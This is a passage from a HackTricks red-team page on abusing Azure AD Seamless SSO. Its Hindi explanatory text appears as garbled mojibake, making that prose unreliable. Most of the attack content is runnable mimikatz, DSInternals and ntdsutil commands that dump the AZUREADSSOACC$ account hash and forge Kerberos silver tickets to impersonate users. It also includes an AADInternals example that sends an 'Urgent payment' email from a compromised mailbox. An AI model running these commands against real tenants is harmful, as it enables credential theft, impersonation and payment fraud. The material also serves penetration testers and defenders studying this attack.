# Az - рд╕реАрдорд▓реЗрд╕ рдПрд╕рдПрд╕рдУ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [NFTs](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [The PEASS Family](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* ЁЯТм [рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [@hacktricks_live](https://twitter.com/hacktricks_live)ред
* [HackTricks](https://github.com/carlospolop/hacktricks) рдФрд░ [HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИ рдЬрдм рд╡реЗ рдЕрдкрдиреЗ рдХреЙрд░реНрдкреЛрд░реЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВ**ред рдЬрдм рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдкрдиреЗ Azure AD рдореЗрдВ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдкрд╛рд╕рд╡рд░реНрдб рдЯрд╛рдЗрдк рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**, рдФрд░ рдЖрдо рддреМрд░ рдкрд░, рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рднреА рдЯрд╛рдЗрдк рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдЖрдкрдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдЕрддрд┐рд░рд┐рдХреНрдд рдСрди-рдкреНрд░реАрдорд┐рд╕ рдШрдЯрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдЖрдкрдХреЗ рдХреНрд▓рд╛рдЙрдб-рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рддрдХ рдЖрд╕рд╛рди рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

<figure><img src="../../../../.gitbook/assets/image (7) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдореВрд▓ рд░реВрдк рд╕реЗ Azure AD Seamless SSO **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИ** рдЬрдм рд╡реЗ **рдСрди-рдкреНрд░реАрдо рдбреЛрдореЗрди рдЬреНрд╡рд╛рдЗрдВрдб рдкреАрд╕реА рдкрд░** рд╣реЛрддреЗ рд╣реИрдВред

рдпрд╣ [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) рдФрд░ [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md) рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рд╣реИред

рдбреЗрд╕реНрдХрдЯреЙрдк рдПрд╕рдПрд╕рдУ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХреЗрд░рдмреЗрд░реЛрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЬрдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, Azure AD Connect рдСрди-рдкреНрд░реАрдо AD рдореЗрдВ **AZUREADSSOACC`$`** рдирд╛рдордХ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдмрдирд╛рддрд╛ рд╣реИред `AZUREADSSOACC$` рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рджреМрд░рд╛рди **рд╕рд╛рджрд╛-рдкрд╛рда рдореЗрдВ Azure AD рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

**рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ** рдХреЛ **NTHash (MD4)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ Azure AD рднреЗрдЬреЗ рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯрд┐рдХрдЯреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИред

**Azure AD** рдПрдХ **рдПрдВрдбрдкреЙрдЗрдВрдЯ** (https://autologon.microsoftazuread-sso.com) рдЙрдкрд▓рдмреНрдз рдХрд░рд╛рддрд╛ рд╣реИ рдЬреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ **рдЯрд┐рдХрдЯ** рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдбреЛрдореЗрди-рдЬреНрд╡рд╛рдЗрдВрдб рдорд╢реАрди рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрд╕рдПрд╕рдУ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдЯрд┐рдХрдЯ рдлрд╝реЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИред

### рдСрди-рдкреНрд░реАрдо -> рдХреНрд▓рд╛рдЙрдб

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`AZUREADSSOACC$` рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рдирд╣реАрдВ рдмрджрд▓рддрд╛**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ **рдЗрд╕ рдЦрд╛рддреЗ рдХреЗ рд╣реИрд╢ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрд┐рд╕реА рднреА рдСрди-рдкреНрд░реАрдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд┐рдВрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд┐рд▓реНрд╡рд░ рдЯрд┐рдХрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ**:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmтАЭ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
рдЖрдк рдЕрдм **рд╕рд┐рд▓реНрд╡рд░ рдЯрд┐рдХрдЯ рдЬреЗрдирд░реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
1. **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ:** Mozilla Firefox рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░реЗрдВред
2. **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:**
   - **`about:config`** рдкрд░ рдЬрд╛рдПрдВред
   - [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) рдХреЗ рд▓рд┐рдП рдкрд╕рдВрдж рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд [рдорд╛рдиреЛрдВ](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically) рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ:
     - `https://aadg.windows.net.nsatc.net`
     - `https://autologon.microsoftazuread-sso.com`
3. **рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:**
   - рд╕рдВрдЧрдарди рдХреЗ AAD рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдЬрд╛рдПрдВред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрджрд╛рд╣рд░рдг рд╣реИ [Office 365](https://portal.office.com/)ред
4. **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛:**
   - рд▓реЙрдЧрдСрди рд╕реНрдХреНрд░реАрди рдкрд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ, рдкрд╛рд╕рд╡рд░реНрдб рдлрд╝реАрд▓реНрдб рдЦрд╛рд▓реА рдЫреЛрдбрд╝ рджреЗрдВред
   - рдЖрдЧреЗ рдмрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╛ рддреЛ TAB рджрдмрд╛рдПрдВ рдпрд╛ ENTERред

{% hint style="success" %}
рдпрд╣ MFA рдХреЛ рдЕрдЧрд░ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдирд╣реАрдВ рдЫреЛрдбрд╝рддрд╛
{% endhint %}

#### ~~рдХреНрд▓рд╛рдЙрдб-рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдмрдирд╛рдирд╛~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

рдпрджрд┐ Active Directory рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЗ рдкрд╛рд╕ Azure AD Connect рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рд╡реЗ **рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП SID рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕ рддрд░рд╣ рдХрд░рдмреЗрд░реЛрд╕ **рдЯрд┐рдХрдЯ** рдХреЛ **рдХреНрд▓рд╛рдЙрдб-рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рднреА рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдПрдХрдорд╛рддреНрд░ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ SID рдПрдХ рдЙрдЪрд┐рдд [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\)) рд╣реЛред

{% hint style="danger" %}
рдХреНрд▓рд╛рдЙрдб-рдХреЗрд╡рд▓ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ SID рдмрджрд▓рдирд╛ рдЕрдм **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рд╣реИ**ред\
рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### On-prem -> Cloud рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╕рд╛рдзрд┐рдд рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдбреЗрд▓реАрдЧреЗрд╢рди <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдЬреЛ рдЗрд╕ рдЦрд╛рддреЗ рдХреЗ рдКрдкрд░ рдХрдВрдЯреЗрдирд░ рдпрд╛ OU рдореЗрдВ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ (`AZUREADSSOACC$`) рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╡рд╣ **рдПрдХ рд╕рдВрд╕рд╛рдзрд┐рдд рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдбреЗрд▓реАрдЧреЗрд╢рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

<figure><img src="../../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: рдореИрдВ рдЖрдкрдХреЗ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рд╣реВрдВ, рд╕рднреА рдХреЗ рдИрдореЗрд▓ рдкрдврд╝ рд░рд╣рд╛ рд╣реВрдВ - рд╣реИрдХрд┐рдВрдЧ рдПрдЬрд╝реНрдпреВрд░ AD рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА](https://www.youtube.com/watch?v=JEIR5oGCwdg)
